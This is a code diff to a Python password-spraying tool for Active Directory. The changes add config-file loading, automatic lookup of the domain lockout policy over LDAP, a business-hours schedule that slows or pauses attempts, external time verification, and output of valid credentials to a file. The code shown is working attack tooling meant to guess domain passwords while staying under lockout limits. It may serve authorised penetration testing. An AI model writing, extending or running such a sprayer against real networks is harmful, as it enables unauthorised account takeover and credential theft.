+        if safe_attempts <= 0:  # Should be paused entirely (handled elsewhere)
             return False
         return self.session.attempts_since_sleep >= safe_attempts
 
@@ -882,12 +1693,54 @@ def fetch_domain_info(
         return users, policy
 
 
+def fetch_policy_only(
+    dc_host: str,
+    username: str,
+    password: str,
+    workgroup: str,
+    use_ssl: bool = False,
+    port: Optional[int] = None,
+    base_dn: Optional[str] = None,
+    verbose: int = 3,
+) -> PasswordPolicy:
+    """
+    Connect to AD and fetch only the policy.
+    Returns PasswordPolicy.
+    """
+    def _print(msg: str, level: int = 3):
+        if verbose >= level:
+            print(msg, file=sys.stderr)
+
+    _print(f"{Colors.BLUE}[+] Connecting to {dc_host} for policy...{Colors.NC}", level=1)
+
+    with ADConnection(
+        dc_host=dc_host,
+        username=username,
+        password=password,
+        workgroup=workgroup,
+        base_dn=base_dn,
+        use_ssl=use_ssl,
+        port=port,
+    ) as ad:
+        _print(f"{Colors.BLUE}[+] Fetching lockout policy...{Colors.NC}", level=1)
+        policy_dict = ad.get_lockout_policy()
+        policy = PasswordPolicy.from_dict(policy_dict)
+
+        _print(f"{Colors.GREEN}[+] Lockout threshold: {policy.lockout_threshold}{Colors.NC}", level=1)
+        _print(f"{Colors.GREEN}[+] Observation window: {policy.lockout_observation_window_minutes} min{Colors.NC}", level=1)
+        _print(f"{Colors.GREEN}[+] Min password length: {policy.min_password_length}{Colors.NC}", level=1)
+        _print(f"{Colors.GREEN}[+] Complexity required: {policy.complexity_enabled}{Colors.NC}", level=1)
+
+        return policy
+
+
 def create_session(
     dc_host: str,
     workgroup: str,
     users: List[str],
     passwords: List[str],
     policy: PasswordPolicy,
+    schedule: Schedule,
     user_as_pass: bool = False,
     use_ssl: bool = False,
     port: Optional[int] = None,
@@ -912,6 +1765,7 @@ def create_session(
     return SpraySession(
         config=config,
         policy=policy,
+        schedule=schedule,
         users=users,
         passwords=passwords,
     )
@@ -953,6 +1807,39 @@ def cmd_spray(args) -> int:
     """Execute a new spray or resume an existing one."""
     session_path = Path(args.session_path)
 
+    # Load config file if specified
+    config_values = {}
+    if hasattr(args, 'config') and args.config:
+        try:
+            config_values = load_config(args.config)
+            print(f"{Colors.GREEN}[+] Loaded config from: {args.config}{Colors.NC}", file=sys.stderr)
+        except Exception as e:
+            print(f"{Colors.RED}[!] Failed to load config: {e}{Colors.NC}", file=sys.stderr)
+            return 1
+
+    # Merge config with CLI args (CLI takes precedence)
+    # Set defaults for args that might not exist
+    for key in ['dc', 'workgroup', 'username', 'password', 'ssl', 'port', 'base_dn',
+                'spray_passwords', 'users_file', 'output', 'userpass', 'verbose',
+                'lockout_threshold', 'lockout_window', 'min_length', 'complexity',
+                'timezone', 'business_hours_reduction', 'daily_hours']:
+        if not hasattr(args, key):
+            setattr(args, key, None)
+
+    # Apply config values where CLI didn't override
+    for key, value in config_values.items():
+        if value is not None:
+            arg_key = key
+            # Handle key name differences
+            if key == 'passwords_file':
+                arg_key = 'spray_passwords'
+            
+            current = getattr(args, arg_key, None)
+            # Only apply config if CLI arg wasn't provided
+            # For booleans, we need special handling since False is a valid value
+            if current is None or (isinstance(current, bool) and not current and value):
+                setattr(args, arg_key, value)
+
     if args.resume:
         # Resume existing session
         try:
@@ -978,9 +1865,33 @@ def cmd_spray(args) -> int:
 
         have_creds = args.username and args.password
 
-        # If no creds, must have users file
-        if not have_creds and not args.users_file:
-            print(f"{Colors.RED}[!] Either provide AD creds (-u/-p) or a users file (--users){Colors.NC}", file=sys.stderr)
+        # Check for 'auto' settings that require creds
+        # Collect all auto settings for clear error messaging
+        auto_settings = []
+        
+        # Check users_file
+        users_auto = args.users_file and str(args.users_file).lower() == 'auto'
+        if users_auto:
+            auto_settings.append('users_file')
+        
+        # Check policy settings
+        if args.lockout_threshold == 'auto':
+            auto_settings.append('lockout_threshold')
+        if args.lockout_window == 'auto':
+            auto_settings.append('lockout_window')
+        if args.min_length == 'auto':
+            auto_settings.append('min_length')
+        if args.complexity == 'auto':
+            auto_settings.append('complexity')
+
+        if auto_settings and not have_creds:
+            print(f"{Colors.RED}[!] AD credentials (-u/-p) required for 'auto' settings{Colors.NC}", file=sys.stderr)
+            print(f"{Colors.RED}[!] The following are set to 'auto': {', '.join(auto_settings)}{Colors.NC}", file=sys.stderr)
+            return 1
+
+        # If no users file specified and no creds, that's an error
+        if not args.users_file and not have_creds:
+            print(f"{Colors.RED}[!] Either provide a users file (--users) or AD credentials (-u/-p) for auto-enumeration{Colors.NC}", file=sys.stderr)
             return 1
 
         # Load passwords to spray
@@ -995,44 +1906,104 @@ def cmd_spray(args) -> int:
             print(f"{Colors.RED}[!] Passwords file is empty{Colors.NC}", file=sys.stderr)
             return 1
 
+        # Build schedule
+        schedule = Schedule.disabled()
+        if args.timezone:
+            try:
+                # Validate timezone
+                ZoneInfo(args.timezone)
+                daily_hours = args.daily_hours if args.daily_hours else {}
+                # Ensure all days have entries
+                for day in DAYS_OF_WEEK:
+                    if day not in daily_hours:
+                        daily_hours[day] = BusinessHoursWindow(start=None, end=None, pause_all_day=False)
+                schedule = Schedule(
+                    timezone=args.timezone,
+                    business_hours_reduction=args.business_hours_reduction or 3,
+                    daily_hours=daily_hours,
+                )
+            except Exception as e:
+                print(f"{Colors.RED}[!] Invalid timezone: {args.timezone}: {e}{Colors.NC}", file=sys.stderr)
+                return 1
+
         # Get users and policy
         if have_creds:
-            # Fetch from AD
+            # Fetch from AD as needed
             try:
-                if args.users_file:
-                    # Use provided users file, fetch policy from AD
-                    with open(args.users_file) as f:
-                        users = [line.strip() for line in f if line.strip()]
+                # Enumerate users from AD if users_file is 'auto' or not specified
+                should_enumerate_users = users_auto or not args.users_file
+                if should_enumerate_users:
+                    # Enumerate users from AD
+                    print(f"{Colors.BLUE}[+] Enumerating users from AD (auto)...{Colors.NC}", file=sys.stderr)
+                    users, ad_policy = fetch_domain_info(
+                        dc_host=args.dc,
+                        username=args.username,
+                        password=args.password,
+                        workgroup=args.workgroup,
+                        use_ssl=args.ssl or False,
+                        port=args.port,
+                        base_dn=args.base_dn,
+                        verbose=args.verbose or 3,
+                    )
+                else:
+                    # Use provided users file
+                    try:
+                        with open(args.users_file) as f:
+                            users = [line.strip() for line in f if line.strip()]
+                    except FileNotFoundError:
+                        print(f"{Colors.RED}[!] Users file not found: {args.users_file}{Colors.NC}", file=sys.stderr)
+                        return 1
                     print(f"{Colors.GREEN}[+] Loaded {len(users)} users from file{Colors.NC}", file=sys.stderr)
 
-                    with ADConnection(
-                        dc_host=args.dc,
-                        username=args.username,
-                        password=args.password,
-                        workgroup=args.workgroup,
-                        base_dn=args.base_dn,
-                        use_ssl=args.ssl,
-                        port=args.port,
-                    ) as ad:
-                        policy_dict = ad.get_lockout_policy()
-                        policy = PasswordPolicy.from_dict(policy_dict)
-                else:
-                    # Enumerate users and fetch policy from AD
-                    users, policy = fetch_domain_info(
-                        dc_host=args.dc,
-                        username=args.username,
-                        password=args.password,
-                        workgroup=args.workgroup,
-                        use_ssl=args.ssl,
-                        port=args.port,
-                        base_dn=args.base_dn,
-                        verbose=args.verbose,
+                    # Check if any policy setting needs to be fetched from AD
+                    policy_auto = (
+                        args.lockout_threshold == 'auto' or
+                        args.lockout_window == 'auto' or
+                        args.min_length == 'auto' or
+                        args.complexity == 'auto'
                     )
+                    if policy_auto:
+                        # Fetch policy from AD
+                        ad_policy = fetch_policy_only(
+                            dc_host=args.dc,
+                            username=args.username,
+                            password=args.password,
+                            workgroup=args.workgroup,
+                            use_ssl=args.ssl or False,
+                            port=args.port,
+                            base_dn=args.base_dn,
+                            verbose=args.verbose or 3,
+                        )
+                    else:
+                        ad_policy = None
+
+                # Build final policy (mix of auto and manual)
+                policy = PasswordPolicy(
+                    lockout_threshold=(
+                        ad_policy.lockout_threshold if args.lockout_threshold == 'auto' and ad_policy
+                        else (args.lockout_threshold if isinstance(args.lockout_threshold, int) else 5)
+                    ),
+                    lockout_duration_minutes=30,
+                    lockout_observation_window_minutes=(
+                        ad_policy.lockout_observation_window_minutes if args.lockout_window == 'auto' and ad_policy
+                        else (args.lockout_window if isinstance(args.lockout_window, int) else 30)
+                    ),
+                    min_password_length=(
+                        ad_policy.min_password_length if args.min_length == 'auto' and ad_policy
+                        else (args.min_length if isinstance(args.min_length, int) else 0)
+                    ),
+                    password_history_length=0,
+                    complexity_enabled=(
+                        ad_policy.complexity_enabled if args.complexity == 'auto' and ad_policy
+                        else (args.complexity if isinstance(args.complexity, bool) else False)
+                    ),
+                )
+
             except Exception as e:
                 print(f"{Colors.RED}[!] Failed to connect to AD: {e}{Colors.NC}", file=sys.stderr)
                 return 1
         else:
-            # No creds - use users file and manual/default policy
+            # No creds - use users file and manual policy (already validated no 'auto' above)
             try:
                 with open(args.users_file) as f:
                     users = [line.strip() for line in f if line.strip()]
@@ -1044,12 +2015,12 @@ def cmd_spray(args) -> int:
             print(f"{Colors.ORANGE}[+] No AD creds - using manual policy settings{Colors.NC}", file=sys.stderr)
 
             policy = PasswordPolicy(
-                lockout_threshold=args.lockout_threshold,
-                lockout_duration_minutes=args.lockout_window,
-                lockout_observation_window_minutes=args.lockout_window,
-                min_password_length=args.min_length,
+                lockout_threshold=args.lockout_threshold if isinstance(args.lockout_threshold, int) else 5,
+                lockout_duration_minutes=args.lockout_window if isinstance(args.lockout_window, int) else 30,
+                lockout_observation_window_minutes=args.lockout_window if isinstance(args.lockout_window, int) else 30,
+                min_password_length=args.min_length if isinstance(args.min_length, int) else 0,
                 password_history_length=0,
-                complexity_enabled=args.complexity,
+                complexity_enabled=args.complexity if isinstance(args.complexity, bool) else False,
             )
 
             print(f"{Colors.BLUE}[+]   Lockout: {policy.lockout_threshold} / {policy.lockout_observation_window_minutes}min{Colors.NC}", file=sys.stderr)
@@ -1066,17 +2037,56 @@ def cmd_spray(args) -> int:
             users=users,
             passwords=passwords,
             policy=policy,
-            user_as_pass=args.userpass,
-            use_ssl=args.ssl,
+            schedule=schedule,
+            user_as_pass=args.userpass or False,
+            use_ssl=args.ssl or False,
             port=args.port,
-            output_file=args.output,
-            verbose=args.verbose,
+            output_file=args.output or 'valid_creds.txt',
+            verbose=args.verbose or 3,
         )
         session.save(session_path)
         print(f"{Colors.GREEN}[+] Created session: {session.config.session_id}{Colors.NC}", file=sys.stderr)
 
+    # Set up time verification
+    force_system_time = getattr(args, 'force_system_time', False)
+    time_verifier = TimeVerifier(
+        force_system_time=force_system_time,
+        verbose=session.config.verbose
+    )
+
+    # Verify time if schedule is enabled
+    if session.schedule.is_enabled():
+        print(f"{Colors.BLUE}[+] Verifying time from external sources...{Colors.NC}", file=sys.stderr)
+        try:
+            result = time_verifier.verify()
+            print(f"{Colors.GREEN}[+] Time verified from: {result.source}{Colors.NC}", file=sys.stderr)
+            
+            if force_system_time:
+                print(f"{Colors.ORANGE}[!] WARNING: Using system clock (--force-system-time){Colors.NC}", file=sys.stderr)
+                print(f"{Colors.ORANGE}[!] Please ensure your system clock is accurate!{Colors.NC}", file=sys.stderr)
+                print(f"{Colors.ORANGE}[!] Incorrect time may cause spraying during business hours.{Colors.NC}", file=sys.stderr)
+            elif not result.drift_acceptable:
+                print(f"{Colors.ORANGE}[!] WARNING: System clock drift detected: {result.offset_seconds:.1f} seconds{Colors.NC}", file=sys.stderr)
+                print(f"{Colors.ORANGE}[!] System time: {result.system_time.strftime('%Y-%m-%d %H:%M:%S')} UTC{Colors.NC}", file=sys.stderr)
+                print(f"{Colors.ORANGE}[!] Verified time: {result.verified_time.strftime('%Y-%m-%d %H:%M:%S')} UTC{Colors.NC}", file=sys.stderr)
+                print(f"{Colors.GREEN}[+] Using verified external time for scheduling.{Colors.NC}", file=sys.stderr)
+            else:
+                print(f"{Colors.GREEN}[+] System clock is accurate (drift: {result.offset_seconds:.1f}s){Colors.NC}", file=sys.stderr)
+                
+        except TimeVerificationError as e:
+            print(f"{Colors.RED}[!] {e}{Colors.NC}", file=sys.stderr)
+            return 1
+    else:
+        # No schedule, but still set up time verifier (will use system time)
+        time_verifier = TimeVerifier(force_system_time=True, verbose=session.config.verbose)
+
     # Run the spray
-    engine = SprayEngine(session, session_path, verbose=session.config.verbose)
+    engine = SprayEngine(
+        session, 
+        session_path, 
+        verbose=session.config.verbose,
+        time_verifier=time_verifier
+    )
     success = engine.run()
 
     return 0 if success else 1
@@ -1153,6 +2163,16 @@ def cmd_export(args) -> int:
     return 0
 
 
+def cmd_generate_config(args) -> int:
+    """Generate a template configuration file."""
+    output = generate_config_file(args.output)
+    if args.output:
+        print(f"{Colors.GREEN}[+] {output}{Colors.NC}", file=sys.stderr)
+    else:
+        print(output)
+    return 0
+
+
 # ---------------------------------------------------------------------------
 # Main
 # ---------------------------------------------------------------------------
@@ -1171,6 +2191,9 @@ def main() -> int:
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
+  # With config file
+  %(prog)s --config spray.ini
+
   # With AD creds (auto-enumerate users and fetch policy)
   %(prog)s -d 10.0.0.1 -w CORP -u admin -p 'P@ss' --passwords passwords.txt
 
@@ -1186,18 +2209,21 @@ Examples:
 
   # Resume existing spray
   %(prog)s --resume 305578a5af638c2b377b41b43e693291
+
+  # Use 'auto' for users and policy (requires AD creds)
+  %(prog)s --config spray.ini  # with users_file=auto, lockout_threshold=auto, etc.
         """,
     )
+    spray_parser.add_argument("-c", "--config", help="Configuration file (INI format)")
     spray_parser.add_argument("-d", "--dc", help="Domain controller FQDN or IP address")
     spray_parser.add_argument("-w", "--workgroup", help="NetBIOS domain/workgroup name (e.g., CORP)")
-    spray_parser.add_argument("-u", "--username", help="Username for AD enumeration (optional if --users provided)")
-    spray_parser.add_argument("-p", "--password", help="Password for AD enumeration (optional if --users provided)")
+    spray_parser.add_argument("-u", "--username", help="Username for AD enumeration (required for 'auto' settings)")
+    spray_parser.add_argument("-p", "--password", help="Password for AD enumeration (required for 'auto' settings)")
     spray_parser.add_argument("--base-dn", dest="base_dn", help="Override LDAP base DN")
     spray_parser.add_argument("--passwords", dest="spray_passwords", help="File containing passwords to spray")
-    spray_parser.add_argument("--users", dest="users_file", help="File containing users (required if no creds)")
-    spray_parser.add_argument("-o", "--output", default="valid_creds.txt",
-                              help="Output file for valid credentials (default: valid_creds.txt)")
-    spray_parser.add_argument("-v", "--verbose", type=int, default=3, choices=[0, 1, 2, 3],
+    spray_parser.add_argument("--users", dest="users_file", help="File containing users, or 'auto' to enumerate from AD")
+    spray_parser.add_argument("-o", "--output", help="Output file for valid credentials (default: valid_creds.txt)")
+    spray_parser.add_argument("-v", "--verbose", type=int, choices=[0, 1, 2, 3],
                               help="Verbosity level (0=silent, 3=max, default: 3)")
     spray_parser.add_argument("--userpass", action="store_true", help="Try username as password")
     spray_parser.add_argument("--ssl", action="store_true", help="Use LDAPS (SSL/TLS)")
@@ -1205,15 +2231,21 @@ Examples:
     spray_parser.add_argument("--resume", metavar="SESSION_ID", help="Resume an existing session")
     spray_parser.add_argument("--session-path", default=str(DEFAULT_SESSION_PATH),
                               help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
-    # Policy override flags (used when no AD creds available)
-    spray_parser.add_argument("--lockout-threshold", type=int, default=5,
-                              help="Lockout threshold override (default: 5)")
-    spray_parser.add_argument("--lockout-window", type=int, default=30,
-                              help="Lockout observation window in minutes (default: 30)")
-    spray_parser.add_argument("--min-length", type=int, default=0,
-                              help="Minimum password length override (default: 0)")
-    spray_parser.add_argument("--complexity", action="store_true",
-                              help="Enable password complexity checking")
+    # Policy override flags (used when no AD creds available, or 'auto' for AD lookup)
+    spray_parser.add_argument("--lockout-threshold", 
+                              help="Lockout threshold (integer or 'auto' for AD lookup)")
+    spray_parser.add_argument("--lockout-window",
+                              help="Lockout observation window in minutes (integer or 'auto')")
+    spray_parser.add_argument("--min-length",
+                              help="Minimum password length (integer or 'auto')")
+    spray_parser.add_argument("--complexity",
+                              help="Password complexity ('true', 'false', or 'auto')")
+    # Schedule options
+    spray_parser.add_argument("--timezone", help="Timezone for business hours (IANA format, e.g., America/New_York)")
+    spray_parser.add_argument("--business-hours-reduction", type=int,
+                              help="Attempt reduction during business hours (default: 3)")
+    spray_parser.add_argument("--force-system-time", action="store_true",
+                              help="Use system clock instead of external time verification (not recommended)")
     spray_parser.set_defaults(func=cmd_spray)
 
     # Sessions subcommand
@@ -1238,11 +2270,52 @@ Examples:
                                help=f"Session storage path (default: {DEFAULT_SESSION_PATH})")
     export_parser.set_defaults(func=cmd_export)
 
+    # Generate-config subcommand
+    genconfig_parser = subparsers.add_parser("generate-config", help="Generate a template configuration file")
+    genconfig_parser.add_argument("-o", "--output", help="Output file path (prints to stdout if not specified)")
+    genconfig_parser.set_defaults(func=cmd_generate_config)
+
     args = parser.parse_args()
 
     # Disable colors if not a TTY
     if not sys.stderr.isatty():
         Colors.disable()
+
+    # Handle policy args that can be 'auto' or int
+    if hasattr(args, 'lockout_threshold') and args.lockout_threshold is not None:
+        if args.lockout_threshold != 'auto':
+            try:
+                args.lockout_threshold = int(args.lockout_threshold)
+            except ValueError:
+                print(f"{Colors.RED}[!] Invalid lockout-threshold: {args.lockout_threshold}{Colors.NC}", file=sys.stderr)
+                return 1
+
+    if hasattr(args, 'lockout_window') and args.lockout_window is not None:
+        if args.lockout_window != 'auto':
+            try:
+                args.lockout_window = int(args.lockout_window)
+            except ValueError:
+                print(f"{Colors.RED}[!] Invalid lockout-window: {args.lockout_window}{Colors.NC}", file=sys.stderr)
+                return 1
+
+    if hasattr(args, 'min_length') and args.min_length is not None:
+        if args.min_length != 'auto':
+            try:
+                args.min_length = int(args.min_length)
+            except ValueError:
+                print(f"{Colors.RED}[!] Invalid min-length: {args.min_length}{Colors.NC}", file=sys.stderr)
+                return 1
+
+    if hasattr(args, 'complexity') and args.complexity is not None:
+        if args.complexity == 'auto':
+            pass
+        elif args.complexity.lower() in ('true', '1', 'yes'):
+            args.complexity = True
+        elif args.complexity.lower() in ('false', '0', 'no'):
+            args.complexity = False
+        else:
+            print(f"{Colors.RED}[!] Invalid complexity: {args.complexity}{Colors.NC}", file=sys.stderr)
+            return 1
 
     if not args.command:
         parser.print_help()
